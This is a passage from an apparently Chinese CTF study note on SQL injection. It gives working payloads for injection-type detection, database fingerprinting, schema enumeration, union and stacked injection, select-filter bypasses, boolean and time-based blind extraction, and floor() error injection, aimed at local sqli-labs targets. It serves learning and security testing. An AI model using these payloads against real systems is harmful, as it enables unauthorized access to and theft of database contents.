href="#3-2判断是字符型还是整数型" class="headerlink" title="3.2判断是字符型还是整数型"></a>3.2判断是字符型还是整数型</h3><ul><li>输入<code>1 and 1=2</code>和<code>1&#39;#</code>和<code>1&#39; and &#39;1&#39;=&#39;1</code>若都回显id为1的信息,则为字符型</li><li>输入<code>1 and 1=2</code>没有回显，且输入<code>1 and 1=1</code>有回显，则为数字型,原因<code>1 and 1=2</code>恒为假，过滤掉所有的行</li></ul><h3 id="3-3判断能否时间盲注"><a href="#3-3判断能否时间盲注" class="headerlink" title="3.3判断能否时间盲注"></a>3.3判断能否时间盲注</h3><table><thead><tr><th align="left">MySQL</th><th align="left">benchmark(100000000,md(5))sleep(3)</th></tr></thead><tbody><tr><td align="left">PostgreSQL</td><td align="left">PG_sleep(5)Generate_series(1,1000000)</td></tr><tr><td align="left">SQLServer</td><td align="left">waitfor delay ‘0:0:5’</td></tr></tbody></table><h3 id="3-4判断数据库类型"><a href="#3-4判断数据库类型" class="headerlink" title="3.4判断数据库类型"></a>3.4判断数据库类型</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>判断是否是 Mysql数据库<span class="hljs-string">&#x27;</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span> information_schema.tables) #<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>判断是否是 access数据库<span class="hljs-string">&#x27;</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span> msysobjects) #<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>判断是否是 Sqlserver数据库<span class="hljs-string">&#x27;</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span> sysobjects) #<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>判断是否是Oracle数据库<span class="hljs-string">&#x27;</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> dual)<span class="hljs-operator">&gt;</span><span class="hljs-number">0</span> #<br></code></pre></td></tr></table></figure><h2 id="四、常用函数、基础知识"><a href="#四、常用函数、基础知识" class="headerlink" title="四、常用函数、基础知识"></a>四、常用函数、基础知识</h2><h3 id="系统函数"><a href="#系统函数" class="headerlink" title="系统函数"></a>系统函数</h3><ul><li>system_user()——系统用户名 </li><li>user()——用户名 </li><li>current_user()——当前用户名 </li><li>session_user()——链接数据库的用户名 </li><li>database()——数据库名 </li><li>version()——数据库版本 </li><li>@@datadir——数据库路径 </li><li>@@basedir——数据库安装路径 </li><li>@@version_conpile_os——操作系统</li></ul><h3 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h3><ul><li>concat(str1,str2,…)——没有分隔符地连接字符串 </li><li>concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串 </li><li>group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据。</li></ul><h3 id="两种注释"><a href="#两种注释" class="headerlink" title="两种注释"></a>两种注释</h3><ul><li>–+</li><li><code>#</code>(url编码%23)</li></ul><h3 id="sql中的逻辑运算"><a href="#sql中的逻辑运算" class="headerlink" title="sql中的逻辑运算"></a>sql中的逻辑运算</h3><p>万能密码构造</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">username<span class="hljs-operator">=</span>’admin’ andpassword<span class="hljs-operator">=</span>’’<span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><blockquote><p>在sql中and运算符优先级大于or运算符，类比&amp;&amp;&gt;||</p></blockquote><p>sql中也能使用位运算</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">Select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-operator">&amp;</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><blockquote><p>&amp;的优先级大于&#x3D;</p></blockquote><h3 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> 字段 [<span class="hljs-keyword">asc</span><span class="hljs-operator">|</span><span class="hljs-keyword">desc</span>]; # <span class="hljs-keyword">asc</span>升序，默认的<br></code></pre></td></tr></table></figure><blockquote><p>用于判断列数，不知道列名时用1 2 3……表示第1 2 3……列</p></blockquote><h3 id="系统数据库（information-schema）"><a href="#系统数据库（information-schema）" class="headerlink" title="系统数据库（information_schema）"></a>系统数据库（information_schema）</h3><p>mysql版本&gt;&#x3D;5.0</p><p>该库中有三个表schemata(各数据库名schema_name)、tables(各表名table_name)、columns(各列名)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata # 查数据库名<br><span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;xxxxx&#x27;</span>; #查表名<br><span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;xxxxx&#x27;</span>; #查列名 <br></code></pre></td></tr></table></figure><h2 id="五、注入类型"><a href="#五、注入类型" class="headerlink" title="五、注入类型"></a>五、注入类型</h2><h3 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h3><p><strong>依据注入点类型分类</strong></p><ul><li><p>数字类型的注入</p></li><li><p>字符串类型的注入</p></li><li><p>搜索型注入</p></li></ul><p><strong>依据提交方式分类</strong></p><ul><li><p>GET注入</p></li><li><p>POST注入</p></li><li><p>COOKIE注入</p></li><li><p>HTTP头注入(XFF注入、UA注入、REFERER注入）</p></li></ul><p><strong>依据获取信息的方式分类</strong></p><ul><li><p>基于布尔的盲注</p></li><li><p>基于时间的盲注</p></li><li><p>基于报错的注入</p></li><li><p>联合查询注入</p></li><li><p>堆叠注入 (可同时执行多条语句)</p></li></ul><h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><p>要求列数一致</p><h3 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;</span><br><span class="hljs-string">?id=-1&#x27;</span>  <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><blockquote><p>整型的也差不多，去掉’</p><p>部分题目也可能在字符型基础上加括号等,若注释被屏蔽</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> …… <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;1</span><br></code></pre></td></tr></table></figure></blockquote><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>多条sql语句一起执行,利用加<code>;</code>的操作</p><h3 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h3><p>受到API或数据库引擎不支持，权限不足等</p><h3 id="常见思路"><a href="#常见思路" class="headerlink" title="常见思路"></a>常见思路</h3><p>可考虑使用RENAME关键字，将想要的数据列名&#x2F;表名更改成返回数据的SQL语句所定义的表&#x2F;列名。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> tables; #查看所有表<br><span class="hljs-keyword">show</span> columns <span class="hljs-keyword">from</span> `表名`; #看列<br>RENAME <span class="hljs-keyword">TABLE</span> `words` <span class="hljs-keyword">TO</span> `words1`; #改名为words1<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> `words` CHANGE `flag` `id` <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>;#将新words表的列flag改为id<br></code></pre></td></tr></table></figure><h3 id="常见bypass"><a href="#常见bypass" class="headerlink" title="常见bypass"></a>常见bypass</h3><p>过滤select时，使用handler语句（mysql专用语句）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">handler users <span class="hljs-keyword">open</span> <span class="hljs-keyword">as</span> hd; #指定数据表users进行载入并将返回句柄重命名为hd<br>handler hd read <span class="hljs-keyword">first</span>; #读取指定表<span class="hljs-operator">/</span>句柄的首行数据<br>handler hd read next; #读取指定表<span class="hljs-operator">/</span>句柄的下一行数据<br>handler hd <span class="hljs-keyword">close</span>; #关闭句柄<br></code></pre></td></tr></table></figure><p>预处理</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">prepare</span> xxx <span class="hljs-keyword">from</span> &quot;sql语句&quot;;<br><span class="hljs-keyword">execute</span> xxx;<br>#由于<span class="hljs-keyword">sql</span>语句是字符串，因此可以使用操作字符串的函数，绕过一些过滤<br>#比如过滤了<span class="hljs-keyword">select</span><br><span class="hljs-keyword">PREPARE</span> st <span class="hljs-keyword">from</span> concat(<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;elect&#x27;</span>, <span class="hljs-string">&#x27; * from `1919810931114514`&#x27;</span>);<span class="hljs-keyword">EXECUTE</span> st;#<br></code></pre></td></tr></table></figure><p>例题：强网杯随便注</p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h3 id="截取字符串常用函数"><a href="#截取字符串常用函数" class="headerlink" title="截取字符串常用函数"></a>截取字符串常用函数</h3><ul><li><p>mid(): <code>mid(s,n,len);</code> 从字符串 s 的 n 位置截取长度为 len 的子字符串</p></li><li><p>substr()&#x2F;substring(): <code>substr(s, start, length); substring(s, start, length)</code> 从字符串 s 的 start 位置截取长度为 length 的子字符串</p></li><li><p>left(): <code>left(s,n);</code> 返回字符串 s 的前 n 个字符</p></li><li><p>right(): <code>right(s,n);</code> 返回字符串 s 的后 n 个字符</p></li><li><p>ascii()&#x2F;ord() <code>ascii(s);/ord(s);</code> 返回字符串 s 的第一个字符的 ASCII 码。 这里不考虑多字节字符，比如汉字</p></li><li><p>trim()&#x2F;rtrim()&#x2F;ltrim() </p><ul><li><code>ltrim(s);</code> 去掉字符串s开始处的空格 </li><li><code>rtrim(s);</code> 去掉字符串s结尾处的空格 </li><li><code>trim(s);</code> 去掉字符串开始和结尾处的空格</li></ul><blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-built_in">TRIM</span>([<span class="hljs-keyword">BOTH</span><span class="hljs-operator">/</span><span class="hljs-keyword">LEADING</span><span class="hljs-operator">/</span><span class="hljs-keyword">TRAILING</span>] 目标字符串 <span class="hljs-keyword">FROM</span> 源字符串);<br><span class="hljs-keyword">BOTH</span>删除两边的指定字符串 <br><span class="hljs-keyword">LEADING</span>删除左边的指定字符串 <br>TARILING删除右边的指定字符串<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">trim</span>(<span class="hljs-keyword">LEADING</span> &quot;a&quot; <span class="hljs-keyword">from</span> &quot;abcd&quot;) <span class="hljs-operator">=</span> <span class="hljs-built_in">trim</span>(<span class="hljs-keyword">LEADING</span> &quot;b&quot; <span class="hljs-keyword">from</span> &quot;abcd&quot;);<br></code></pre></td></tr></table></figure><p>以这个为例，我们将删除的字符串ASCII差限制在1，例如a和b 当这个结果返回0时(说明有一个成功匹配)，则第一个字符是a或者b。 </p><p>接着让a的ASCII+2变成c，如果返回1(bc都不匹配)，则字符串第一位为a，反之第一位为b。</p><p>这样做的目的是为了方便写脚本 第二个字符判断 select trim(LEADING “aa” from “abcd”) &#x3D; trim(LEADING “ab” from “abcd”); 接着重复上面的过程，判断第二个字符 以此推出整个字符串</p><p>如果&#x3D;用regexp替代那么正确的字符一定在regexp前面以这个abcd为例 Trim(leading ‘a’ from ‘abcd’) regexp trim(LEADING ‘x’ from ‘abcd’) 就是bcd regexp abcd返回0， 如果反过来就是abcd regexp bcd 返回1 因此只需判断第一步即可，而不需要ASCII+2去判断了 </p><p>⚠️：如果用regexp，要先在<code>trim(LEADING &quot;a&quot; from &quot;abcd&quot;) != trim(LEADING &quot;b&quot; from &quot;abcd&quot;)</code>的条件下，因为两个相同字符串间的regexp也会返回1</p><p>注：y1ng师傅在[HFCTF 2021 Final]hatenum中用到了这个方法，通过持续递归，多次套娃trim。如果字符串长度被限制，可使用。一次只截断几个字符</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">trim</span>(<span class="hljs-keyword">LEADING</span> &quot;b&quot; <span class="hljs-keyword">from</span> <span class="hljs-built_in">trim</span>(<span class="hljs-keyword">LEADING</span> &quot;a&quot; <span class="hljs-keyword">from</span> &quot;abcd&quot;)); <span class="hljs-comment">-- cd </span><br></code></pre></td></tr></table></figure><p>先截断a，返回字符串bcd，在截断b，返回字符串cd</p></blockquote></li><li><p>Insert()</p><blockquote><p><code>INSERT(s1,x,len,s2)</code> 字符串 s2 替换 s1 的 x 位置开始长度为 len 的字符串</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql">例子：第一步删除起始的前x位<br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">INSERT</span>(&quot;abcdef&quot;, <span class="hljs-number">1</span>,<span class="hljs-number">0</span>, &quot;&quot;);<br><span class="hljs-comment">-- 输出：abcdef</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">INSERT</span>(&quot;abcdef&quot;, <span class="hljs-number">1</span>,<span class="hljs-number">1</span>, &quot;&quot;);<br><span class="hljs-comment">-- 输出：bcdef</span><br>第二步套娃删除x<span class="hljs-operator">+</span><span class="hljs-number">1</span>位以后的所有<br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">INSERT</span>((<span class="hljs-keyword">INSERT</span>(&quot;abcdef&quot;, <span class="hljs-number">1</span>,<span class="hljs-number">0</span>, &quot;&quot;)),<span class="hljs-number">2</span>,<span class="hljs-number">9999</span>,&quot;&quot;);<br><span class="hljs-comment">-- 输出：a</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">INSERT</span>((<span class="hljs-keyword">INSERT</span>(&quot;abcdef&quot;, <span class="hljs-number">1</span>,<span class="hljs-number">1</span>, &quot;&quot;)),<span class="hljs-number">2</span>,<span class="hljs-number">9999</span>,&quot;&quot;);<br><span class="hljs-comment">-- 输出：b</span><br></code></pre></td></tr></table></figure></blockquote></li></ul><h3 id="盲注常用方法"><a href="#盲注常用方法" class="headerlink" title="盲注常用方法"></a>盲注常用方法</h3><ul><li><p>if&#x2F;case 用在select查询当中，当做一种条件来进行判断</p><blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql">if(条件,为真结果,为假结果)<br># <span class="hljs-keyword">case</span>语法（两种）<br>简单函数 <br><span class="hljs-keyword">CASE</span> [col_name] <span class="hljs-keyword">WHEN</span> [value1] <span class="hljs-keyword">THEN</span> [result1]…<span class="hljs-keyword">ELSE</span> [<span class="hljs-keyword">default</span>] <span class="hljs-keyword">END</span><br>搜索函数 <br><span class="hljs-keyword">CASE</span> <span class="hljs-keyword">WHEN</span> [expr] <span class="hljs-keyword">THEN</span> [result1]…<span class="hljs-keyword">ELSE</span> [<span class="hljs-keyword">default</span>] <span class="hljs-keyword">END</span><br><span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;b&#x27;</span> <span class="hljs-keyword">when</span> <span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-keyword">then</span> <span class="hljs-number">1</span> <span class="hljs-keyword">when</span> <span class="hljs-string">&#x27;b&#x27;</span> <span class="hljs-keyword">then</span> <span class="hljs-number">2</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">end</span>; #<span class="hljs-number">2</span><br><span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-keyword">when</span> <span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-keyword">then</span> <span class="hljs-number">1</span>  <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">end</span>; #<span class="hljs-number">1</span><br><span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> <span class="hljs-number">98</span><span class="hljs-operator">&gt;</span><span class="hljs-number">12</span> <span class="hljs-keyword">then</span> <span class="hljs-number">1</span> <span class="hljs-keyword">when</span> <span class="hljs-number">3</span><span class="hljs-operator">&lt;</span><span class="hljs-number">1</span> <span class="hljs-keyword">then</span> <span class="hljs-number">2</span> <span class="hljs-keyword">when</span> <span class="hljs-number">98</span><span class="hljs-operator">&gt;</span><span class="hljs-number">3</span> <span class="hljs-keyword">then</span> <span class="hljs-number">3</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">end</span>; #<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>搜索函数优先匹配第一个为真的条件,也可以只写一个条件，代替if语句</p></blockquote></li><li><p>regexp&#x2F;rlike 正则表达式注入（可以代替if）</p><blockquote> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(if((<span class="hljs-keyword">user</span>() regexp <span class="hljs-string">&#x27;^r&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">0</span>));<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">user</span>() regexp<span class="hljs-string">&#x27;^ri&#x27;</span>); # i表示不区分大小写<br><br><span class="hljs-keyword">select</span> rpad(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">4999999</span>,<span class="hljs-string">&#x27;a&#x27;</span>) RLIKE concat(repeat(<span class="hljs-string">&#x27;(a.*)+&#x27;</span>,<span class="hljs-number">30</span>),<span class="hljs-string">&#x27;b&#x27;</span>);<br></code></pre></td></tr></table></figure> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> information_schema.tables<br><span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> table_name regexp <span class="hljs-string">&#x27;^us[a-z]&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p> 这里只要更换regexp表达式即可</p><p> <img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032231275.jpg" alt="image-20220708162044974"></p><p> 注：regexp不区分大小写，需要大小写敏感要加上binary关键字</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-type">binary</span> database() regexp &quot;^CTF&quot;;<br></code></pre></td></tr></table></figure></blockquote></li><li><p>like匹配注入(适用于&#x3D;被过滤)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;ro%&#x27;</span>;<br></code></pre></td></tr></table></figure></li><li><p>benchmark函数 测试操作性能</p></li><li><p>get_lock</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>第一个连接<br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> get_lock(<span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-number">1</span>);<br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------+</span><br><span class="hljs-operator">|</span> get_lock(<span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------+</span><br><span class="hljs-operator">|</span>                 <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>打开另一个cmd  再次连接mysql，执行get_lock，发现延时<br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> get_lock(<span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-number">1</span>);<br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------+</span><br><span class="hljs-operator">|</span> get_lock(<span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------+</span><br><span class="hljs-operator">|</span>                 <span class="hljs-number">0</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">1.00</span> sec)<br></code></pre></td></tr></table></figure><blockquote><p>利用场景是有条件限制的：需要提供长连接。在Apache+PHP搭建的环境中需要使用mysql_pconnect(打开一个到 MySQL 服务器的持久连接)函数来连接数据库。在CTF中，只有出题人很刻意的使用这个函数，才暗示使用这个</p></blockquote></li></ul><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">if(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">115</span>,<span class="hljs-number">0</span>,sleep(<span class="hljs-number">5</span>))#<br># sleep延时<br><span class="hljs-keyword">select</span> sleep(find_in_set(mid(@<span class="hljs-variable">@version</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;0,1,2,3,4,5,6,7,8,9,.&#x27;</span>));# 在<span class="hljs-number">0</span><span class="hljs-number">-9.</span>中找版本号第一位<br></code></pre></td></tr></table></figure><blockquote><p>sleep函数延时不常用，时间可能因网速影响</p></blockquote><p>利用BENCHMARK()进行延时注入 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27;</span><span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> (IF(<span class="hljs-built_in">SUBSTRING</span>(<span class="hljs-keyword">current</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">115</span>),BENCHMARK(<span class="hljs-number">50000000</span>,ENCODE(<span class="hljs-string">&#x27;MSG&#x27;</span>,<span class="hljs-string">&#x27;by 5 seconds&#x27;</span>)),<span class="hljs-keyword">null</span>)),<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">select</span> database() <span class="hljs-keyword">as</span> <span class="hljs-keyword">current</span>) <span class="hljs-keyword">as</span> tb1<span class="hljs-comment">--+</span><br># 当结果正确的时候，运行ENCODE(<span class="hljs-string">&#x27;MSG&#x27;</span>,<span class="hljs-string">&#x27;by 5 seconds&#x27;</span>)操作<span class="hljs-number">50000000</span> 次，会占用一段时间。<br></code></pre></td></tr></table></figure><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="报错盲注–floor报错"><a href="#报错盲注–floor报错" class="headerlink" title="报错盲注–floor报错"></a>报错盲注–floor报错</h3><p><u>适用于低版本，mysql8似乎被修复</u></p><p>floor报错注入是利用 <code>select count(*),(floor(rand(0)*2)) x from users group by x</code>这个相对固定的语句格式，导致的数据库报错</p><h4 id="函数说明"><a href="#函数说明" class="headerlink" title="函数说明"></a>函数说明</h4><ul><li>rand() 是一个随机函数(产生0到1间随机浮点数),直接使用每次产生的数都不同，但是当提供了一个固定的随机数的种子0之后：这样每次产生的值都是一样的。</li><li>floor(rand(0)*2） floor()是向下取整，这样可以得到只含0 1的伪随机序列</li></ul><h4 id="报错原因"><a href="#报错原因" class="headerlink" title="报错原因"></a>报错原因</h4><p>当执行以下语句时会报错(主键冲突)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>) x <span class="hljs-keyword">from</span> users <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x;<br></code></pre></td></tr></table></figure><blockquote><p>主要利用floor(rand(0)*2)的结果规律为0 1 1 0 1 